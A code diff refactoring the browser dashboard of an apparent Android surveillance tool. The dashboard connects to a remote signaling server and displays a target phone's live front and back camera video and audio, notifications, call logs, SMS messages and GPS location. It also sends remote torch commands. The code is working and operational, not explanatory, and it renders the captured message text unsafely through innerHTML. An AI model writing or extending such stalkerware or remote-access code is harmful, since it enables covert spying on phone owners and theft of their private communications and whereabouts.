@@ -1,54 +1,40 @@
-// Use Render URL directly for signaling server
-const socket = io("https://hypewebrtc.onrender.com", {
+// Signaling server URL
+const SIGNALING_URL = 'https://hypewebrtc.onrender.com';
+
+const socket = io(SIGNALING_URL, {
   reconnection: true,
-  reconnectionAttempts: 15,
-  reconnectionDelay: 1000,
-  reconnectionDelayMax: 5000,
-  randomizationFactor: 0.5
+  reconnectionAttempts: Infinity,
+  reconnectionDelay: 2000,
+  reconnectionDelayMax: 8000,
+  randomizationFactor: 0.4
 });
 
-const videoFront = document.getElementById('remoteVideoFront');
-const videoBack = document.getElementById('remoteVideoBack');
-const statusDiv = document.getElementById('status');
+const videoFront       = document.getElementById('remoteVideoFront');
+const videoBack        = document.getElementById('remoteVideoBack');
+const statusDiv        = document.getElementById('status');
 const notificationsDiv = document.getElementById('notifications');
-const callLogsDiv = document.getElementById('callLogs');
-const smsDiv = document.getElementById('smsMessages');
-const debugLog = document.getElementById('debugLog');
-const retryButton = document.getElementById('retryButton');
-let peer;
-let myId;
-let androidClientId;
-let map;
-let marker;
-let audioTrack = null;
+const callLogsDiv      = document.getElementById('callLogs');
+const smsDiv           = document.getElementById('smsMessages');
+const debugLog         = document.getElementById('debugLog');
+const retryButton      = document.getElementById('retryButton');
+
+let peer          = null;
+let myId          = null;
+let androidClientId = null;
+let map           = null;
+let marker        = null;
+let audioTrack    = null;
 let frontVideoTrack = null;
-let backVideoTrack = null;
+let backVideoTrack  = null;
+let activeDownloads = {};
 
-// Chunked Download State
-let activeDownloads = {}; // Map of fileId -> { name, buffer, totalChunks, receivedChunks }
-
-const config = {
+// ── ICE config — mirrors Android side ────────────────────────────────────────
+const RTC_CONFIG = {
   iceServers: [
-    // Google STUN
+    { urls: ['stun:stun.l.google.com:19302', 'stun:stun1.l.google.com:19302', 'stun:stun2.l.google.com:19302'] },
+    { urls: ['turn:freestun.net:3478', 'turns:freestun.net:5349'], username: 'free', credential: 'free' },
     {
-      urls: [
-        'stun:stun.l.google.com:19302'
-      ]
-    },
-    // Metered STUN
-    {
-      urls: [
-        'stun:stun.relay.metered.ca:80'
-      ]
-    },
-    // Metered TURN
-    {
-      urls: [
-        'turn:global.relay.metered.ca:80',
-        'turn:global.relay.metered.ca:80?transport=tcp',
-        'turn:global.relay.metered.ca:443',
-        'turns:global.relay.metered.ca:443?transport=tcp'
-      ],
+      urls: ['turn:global.relay.metered.ca:80', 'turn:global.relay.metered.ca:443', 'turns:global.relay.metered.ca:443?transport=tcp'],
       username: 'openrelayproject',
       credential: 'openrelayproject'
     }
@@ -56,286 +42,218 @@ const config = {
   iceCandidatePoolSize: 10
 };
 
-function updateStatus(message) {
-  console.log(message);
-  statusDiv.textContent = message;
-  logDebug(message);
-  retryButton.style.display = message.includes('Failed') ? 'block' : 'none';
+// ── Helpers ───────────────────────────────────────────────────────────────────
+function updateStatus(msg) {
+  console.log(msg);
+  statusDiv.textContent = msg;
+  logDebug(msg);
+  retryButton.style.display = msg.includes('Failed') ? 'block' : 'none';
 }
 
-function logDebug(message) {
-  const logEntry = document.createElement('div');
-  logEntry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
-  debugLog.prepend(logEntry);
-  while (debugLog.children.length > 50) {
-    debugLog.removeChild(debugLog.lastChild);
-  }
+function logDebug(msg) {
+  const el = document.createElement('div');
+  el.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+  debugLog.prepend(el);
+  while (debugLog.children.length > 50) debugLog.removeChild(debugLog.lastChild);
 }
 
-function addNotification(notification) {
-  const notificationEl = document.createElement('div');
-  notificationEl.className = 'notification';
-  notificationEl.innerHTML = `
-    <p><strong>App:</strong> ${notification.appName}</p>
-    <p><strong>Title:</strong> ${notification.title}</p>
-    <p><strong>Text:</strong> ${notification.text}</p>
-    <p class="timestamp">${notification.timestamp}</p>
-  `;
-  notificationsDiv.prepend(notificationEl);
-  while (notificationsDiv.children.length > 10) {
-    notificationsDiv.removeChild(notificationsDiv.lastChild);
-  }
-  logDebug(`Received notification from ${notification.appName}`);
+function addNotification(n) {
+  const el = document.createElement('div'); el.className = 'notification';
+  el.innerHTML = `<p><strong>App:</strong> ${n.appName}</p><p><strong>Title:</strong> ${n.title}</p><p><strong>Text:</strong> ${n.text}</p><p class="timestamp">${n.timestamp}</p>`;
+  notificationsDiv.prepend(el);
+  while (notificationsDiv.children.length > 10) notificationsDiv.removeChild(notificationsDiv.lastChild);
 }
 
-function addCallLog(call) {
-  const callLogEl = document.createElement('div');
-  callLogEl.className = 'call-log';
-  callLogEl.innerHTML = `
-    <p><strong>Number:</strong> ${call.number}</p>
-    <p><strong>Type:</strong> ${call.type}</p>
-    <p><strong>Date:</strong> ${call.date}</p>
-    <p><strong>Duration:</strong> ${call.duration} seconds</p>
-  `;
-  callLogsDiv.prepend(callLogEl);
-  while (callLogsDiv.children.length > 10) {
-    callLogsDiv.removeChild(callLogsDiv.lastChild);
-  }
-  logDebug(`Received call log: ${call.number}`);
+function addCallLog(c) {
+  const el = document.createElement('div'); el.className = 'call-log';
+  el.innerHTML = `<p><strong>Number:</strong> ${c.number}</p><p><strong>Type:</strong> ${c.type}</p><p><strong>Date:</strong> ${c.date}</p><p><strong>Duration:</strong> ${c.duration}s</p>`;
+  callLogsDiv.prepend(el);
+  while (callLogsDiv.children.length > 10) callLogsDiv.removeChild(callLogsDiv.lastChild);
 }
 
-function addSmsMessage(sms) {
-  const smsEl = document.createElement('div');
-  smsEl.className = 'sms-message';
-  smsEl.innerHTML = `
-    <p><strong>Address:</strong> ${sms.address}</p>
-    <p><strong>Type:</strong> ${sms.type}</p>
-    <p><strong>Date:</strong> ${sms.date}</p>
-    <p><strong>Body:</strong> ${sms.body}</p>
-  `;
-  smsDiv.prepend(smsEl);
-  while (smsDiv.children.length > 50) {
-    smsDiv.removeChild(smsDiv.lastChild);
-  }
-  logDebug(`Received SMS from ${sms.address}`);
+function addSmsMessage(s) {
+  const el = document.createElement('div'); el.className = 'sms-message';
+  el.innerHTML = `<p><strong>Address:</strong> ${s.address}</p><p><strong>Type:</strong> ${s.type}</p><p><strong>Date:</strong> ${s.date}</p><p><strong>Body:</strong> ${s.body}</p>`;
+  smsDiv.prepend(el);
+  while (smsDiv.children.length > 50) smsDiv.removeChild(smsDiv.lastChild);
 }
 
 function initMap() {
   map = L.map('mapContainer').setView([0, 0], 13);
   L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-    attribution: '© <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
+    attribution: '\u00a9 OpenStreetMap contributors'
   }).addTo(map);
 }
 
-function updateMap(latitude, longitude) {
-  if (!map) {
-    initMap();
+function updateMap(lat, lng) {
+  if (!map) initMap();
+  if (marker) marker.setLatLng([lat, lng]);
+  else { marker = L.marker([lat, lng]).addTo(map); marker.bindPopup('Device Location').openPopup(); }
+  map.setView([lat, lng], 13);
+}
+
+// ── Video stream assignment ──────────────────────────────────────────────────
+function assignTrack(track) {
+  // Match by id label set on Android
+  if (track.kind === 'audio') {
+    audioTrack = track;
+  } else if (track.kind === 'video') {
+    // track.id on Android is set as 'front_camera' or 'back_camera'
+    if (!frontVideoTrack) {
+      frontVideoTrack = track;
+    } else if (!backVideoTrack) {
+      backVideoTrack = track;
+    }
   }
-  if (marker) {
-    marker.setLatLng([latitude, longitude]);
-  } else {
-    marker = L.marker([latitude, longitude]).addTo(map);
-    marker.bindPopup('Device Location').openPopup();
-  }
-  map.setView([latitude, longitude], 13);
-  logDebug(`Updated map to lat=${latitude}, lng=${longitude}`);
+  updateStreams();
 }
 
 function updateStreams() {
   if (frontVideoTrack) {
-    const frontStream = new MediaStream([frontVideoTrack]);
-    if (audioTrack) frontStream.addTrack(audioTrack);
-    videoFront.srcObject = frontStream;
-    videoFront.onloadedmetadata = () => {
-      videoFront.play().catch(err => {
-        console.error('Autoplay blocked for front:', err);
-        updateStatus('Tap the front video to start playback');
-        videoFront.setAttribute('controls', 'true');
-      });
-    };
+    const s = new MediaStream([frontVideoTrack]);
+    if (audioTrack) s.addTrack(audioTrack);
+    videoFront.srcObject = s;
+    videoFront.onloadedmetadata = () => videoFront.play().catch(() => videoFront.setAttribute('controls', 'true'));
   }
   if (backVideoTrack) {
-    const backStream = new MediaStream([backVideoTrack]);
-    if (audioTrack) backStream.addTrack(audioTrack);
-    videoBack.srcObject = backStream;
-    videoBack.onloadedmetadata = () => {
-      videoBack.play().catch(err => {
-        console.error('Autoplay blocked for back:', err);
-        updateStatus('Tap the back video to start playback');
-        videoBack.setAttribute('controls', 'true');
-      });
-    };
+    const s = new MediaStream([backVideoTrack]);
+    videoBack.srcObject = s;
+    videoBack.onloadedmetadata = () => videoBack.play().catch(() => videoBack.setAttribute('controls', 'true'));
   }
   updateStatus('Receiving remote streams');
 }
 
-function reconnectSocket() {
-  updateStatus('Attempting to reconnect to server...');
-  socket.connect();
+// ── Peer connection ──────────────────────────────────────────────────────────
+function createPeer(fromId) {
+  if (peer) { try { peer.close(); } catch(e) {} peer = null; }
+  peer = new RTCPeerConnection(RTC_CONFIG);
+
+  // Add receive-only transceivers to match Android's send-only
+  peer.addTransceiver('video', { direction: 'recvonly' });
+  peer.addTransceiver('video', { direction: 'recvonly' });
+  peer.addTransceiver('audio', { direction: 'recvonly' });
+
+  peer.ontrack = e => {
+    logDebug(`Track received: kind=${e.track.kind} id=${e.track.id}`);
+    assignTrack(e.track);
+  };
+
+  peer.onicecandidate = e => {
+    if (!e.candidate || !androidClientId) return;
+    socket.emit('signal', { to: androidClientId, from: myId, signal: { candidate: e.candidate } });
+  };
+
+  peer.oniceconnectionstatechange = () => {
+    const s = peer.iceConnectionState;
+    logDebug(`ICE state: ${s}`);
+    updateStatus(`ICE: ${s}`);
+    if (s === 'failed') {
+      logDebug('ICE failed — attempting restart via re-connection');
+      // Close and null so next offer rebuilds
+      peer.close(); peer = null;
+      frontVideoTrack = null; backVideoTrack = null; audioTrack = null;
+      updateStatus('ICE failed — waiting for Android to re-offer');
+    } else if (s === 'connected' || s === 'completed') {
+      updateStatus('Video stream connected ✓');
+    }
+  };
+
+  peer.onsignalingstatechange = () => logDebug(`Signaling state: ${peer.signalingState}`);
+  return peer;
 }
 
-socket.on('connect', () => {
-  updateStatus('Connected to signaling server');
-});
+// ── Torch control ────────────────────────────────────────────────────────────
+function sendTorch(on) {
+  socket.emit('torch', { on });
+  logDebug(`Torch command sent: ${on}`);
+}
 
-socket.on('connect_error', (error) => {
-  const message = `Socket.IO connection error: ${error.message} (${error.type})`;
-  console.error(message);
-  updateStatus('Failed to connect to server. Retrying...');
+// Expose to HTML buttons
+window.torchOn  = () => sendTorch(true);
+window.torchOff = () => sendTorch(false);
+
+// ── Socket events ─────────────────────────────────────────────────────────────
+socket.on('connect', () => updateStatus('Connected to signaling server'));
+socket.on('disconnect', reason => {
+  updateStatus(`Disconnected: ${reason} — reconnecting...`);
+  logDebug(`Socket disconnected: ${reason}`);
 });
+socket.on('connect_error', err => updateStatus(`Connect error: ${err.message} — retrying...`));
 
 socket.on('id', id => {
   myId = id;
-  logDebug(`Received socket ID: ${myId}`);
+  logDebug(`My socket ID: ${myId}`);
   socket.emit('identify', 'web');
   socket.emit('web-client-ready', myId);
-  updateStatus('Announced readiness to receive stream');
+  updateStatus('Announced readiness');
 });
 
 socket.on('android-client-ready', id => {
-  if (androidClientId !== id) {
-    androidClientId = id;
-    logDebug(`Android client ready: ${id}`);
-    updateStatus('Android client connected');
-  }
+  androidClientId = id;
+  logDebug(`Android client ready: ${id}`);
+  updateStatus('Android connected — waiting for stream...');
 });
 
-socket.on('notification', data => {
-  logDebug(`Received notification from ${data.from}`);
-  if (data.notification) {
-    addNotification(data.notification);
-  }
+socket.on('android-client-disconnected', () => {
+  updateStatus('Android disconnected');
+  if (peer) { peer.close(); peer = null; }
+  videoFront.srcObject = null;
+  videoBack.srcObject  = null;
+  frontVideoTrack = null; backVideoTrack = null; audioTrack = null;
+  notificationsDiv.innerHTML = '';
+  callLogsDiv.innerHTML = '';
+  smsDiv.innerHTML = '';
+  if (marker) { marker.remove(); marker = null; }
+  logDebug('Android client disconnected — peer cleaned up');
 });
 
-socket.on('call_log', data => {
-  logDebug(`Received call log from ${data.from}`);
-  if (data.call_logs) {
-    data.call_logs.forEach(call => addCallLog(call));
-  }
-});
+socket.on('notification', data => { if (data.notification) addNotification(data.notification); });
+socket.on('call_log',     data => { if (data.call_logs)    data.call_logs.forEach(c => addCallLog(c)); });
+socket.on('sms',          data => { if (data.sms_messages) data.sms_messages.forEach(s => addSmsMessage(s)); });
+socket.on('location',     data => updateMap(data.latitude, data.longitude));
 
-socket.on('sms', data => {
-  logDebug(`Received SMS messages from ${data.from}`);
-  if (data.sms_messages) {
-    data.sms_messages.forEach(sms => addSmsMessage(sms));
-  }
-});
-
-socket.on('location', data => {
-  logDebug(`Received location from ${data.from}: lat=${data.latitude}, lng=${data.longitude}`);
-  updateMap(data.latitude, data.longitude);
-});
-
-socket.on('signal', async (data) => {
-  logDebug(`Received signal from ${data.from}: ${data.signal.type || 'candidate'}`);
+socket.on('signal', async data => {
   const { from, signal } = data;
+  logDebug(`Signal from ${from}: ${signal.type || 'candidate'}`);
 
   if (!androidClientId || androidClientId !== from) {
-      androidClientId = from;
-      logDebug(`[Recovery] Set androidClientId from signal: ${from}`);
-      updateStatus('Android client detected via signal');
+    androidClientId = from;
+    logDebug(`Set androidClientId: ${from}`);
   }
 
   if (!peer) {
-    logDebug('Creating new peer connection');
-    try {
-      peer = new RTCPeerConnection(config);
-      peer.addTransceiver('video', { direction: 'recvonly' });
-      peer.addTransceiver('video', { direction: 'recvonly' });
-      peer.addTransceiver('audio', { direction: 'recvonly' });
-
-      peer.ontrack = (event) => {
-        const track = event.track;
-        if (track.kind === 'audio') {
-          audioTrack = track;
-        } else if (track.kind === 'video' && track.id === 'front_camera') {
-          frontVideoTrack = track;
-        } else if (track.kind === 'video' && track.id === 'back_camera') {
-          backVideoTrack = track;
-        }
-        updateStreams();
-      };
-
-      peer.onicecandidate = e => {
-        if (e.candidate) {
-          logDebug(`Sending ICE candidate: ${e.candidate.sdpMid}`);
-          socket.emit('signal', {
-            to: from,
-            from: myId,
-            signal: { candidate: e.candidate }
-          });
-        }
-      };
-
-      peer.oniceconnectionstatechange = () => {
-        logDebug(`ICE connection state: ${peer.iceConnectionState}`);
-        updateStatus(`ICE connection: ${peer.iceConnectionState}`);
-        if (peer.iceConnectionState === 'failed') {
-          updateStatus('Connection failed, please refresh or retry');
-        }
-      };
-
-      peer.onsignalingstatechange = () => {
-        logDebug(`Signaling state: ${peer.signalingState}`);
-      };
-    } catch (err) {
-      console.error('Failed to create peer connection:', err);
-      updateStatus(`Peer connection error: ${err.message}`);
-    }
+    logDebug('No peer — creating new RTCPeerConnection');
+    createPeer(from);
   }
 
   try {
     if (signal.type === 'offer') {
-      logDebug(`Processing offer from Android, SDP: ${signal.sdp.substring(0, 50)}...`);
+      // If we're in wrong state, reset
+      if (peer.signalingState !== 'stable' && peer.signalingState !== 'have-remote-offer') {
+        logDebug(`Resetting peer due to state: ${peer.signalingState}`);
+        createPeer(from);
+      }
       await peer.setRemoteDescription(new RTCSessionDescription(signal));
       const answer = await peer.createAnswer();
-      logDebug(`Created answer, SDP: ${answer.sdp.substring(0, 50)}...`);
       await peer.setLocalDescription(answer);
-      logDebug('Sending answer back to Android');
-      socket.emit('signal', {
-        to: from,
-        from: myId,
-        signal: { type: 'answer', sdp: answer.sdp }
-      });
+      socket.emit('signal', { to: from, from: myId, signal: { type: 'answer', sdp: answer.sdp } });
+      logDebug('Answer sent to Android');
     } else if (signal.candidate) {
-      logDebug(`Adding ICE candidate: ${signal.candidate.candidate}`);
       await peer.addIceCandidate(new RTCIceCandidate(signal.candidate));
     }
   } catch (err) {
-    console.error('Error handling signal:', err);
-    updateStatus(`Error: ${err.message}`);
+    console.error('Signal handling error:', err);
+    logDebug(`Signal error: ${err.message}`);
+    // Reset peer on error so next offer can rebuild cleanly
+    if (peer) { peer.close(); peer = null; }
   }
 });
 
-socket.on('android-client-disconnected', () => {
-  updateStatus('Android client disconnected');
-  if (peer) {
-    peer.close();
-    peer = null;
-    videoFront.srcObject = null;
-    videoBack.srcObject = null;
-    document.body.style.backgroundColor = '#111827';
-  }
-  notificationsDiv.innerHTML = '';
-  callLogsDiv.innerHTML = '';
-  smsDiv.innerHTML = '';
-  if (marker) {
-    marker.remove();
-    marker = null;
-  }
-  logDebug('Android client disconnected');
-});
+socket.on('error', err => updateStatus(`Server error: ${err.message}`));
 
-socket.on('error', (error) => {
-  console.error('Socket.IO server error:', error);
-  updateStatus(`Server error: ${error.message}`);
-});
+retryButton.addEventListener('click', () => socket.connect());
 
-retryButton.addEventListener('click', reconnectSocket);
-
-// File system UI + handlers stay the same...
-// (fsPathInput, fsBackBtn, fsGoBtn, fileListDiv, requestFileList, renderFileList, etc.)
-
+// Init
 updateStatus('Connecting to server...');
-logDebug('Web client initializing...');
+logDebug('Web client starting...');
 initMap();
